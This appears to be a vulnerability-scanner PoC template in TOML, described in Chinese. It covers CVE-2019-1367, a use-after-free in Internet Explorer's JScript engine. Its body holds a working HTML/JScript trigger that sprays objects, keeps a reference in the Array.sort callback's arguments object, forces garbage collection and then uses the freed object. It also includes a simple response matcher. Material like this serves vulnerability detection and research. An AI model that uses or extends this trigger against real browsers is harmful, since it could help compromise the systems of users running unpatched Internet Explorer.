[info]
author = "AVE"
description = "检测 Internet Explorer JScript 引擎在 Array.sort 回调中 arguments 对象未被垃圾回收器正确追踪导致的释放后重用漏洞"
id = "POC-AVE-2019-0509"
name = "CVE-2019-1367 PoC"
severity = "high"
tags = ["ave-2019-0509"]
vuln_id = [
    "CVE-2019-1367",
    "AVE-2019-0509",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/poc.html"
protocol = "http"

[poc.requests.body]
content = """
<!-- saved from url=(0014)about:internet -->
<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
<script language="Jscript.Encode">
var spray = new Array();
function F() {
    for (var i = 0; i < 20000; i++) spray[i] = new Object();
    arguments[0] = spray[5000];
    for (var i = 0; i < 20000; i++) spray[i] = 1;
    CollectGarbage();
    alert(arguments[0]);
}
[1,2].sort(F);
</script>"""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Jscript.Encode"]
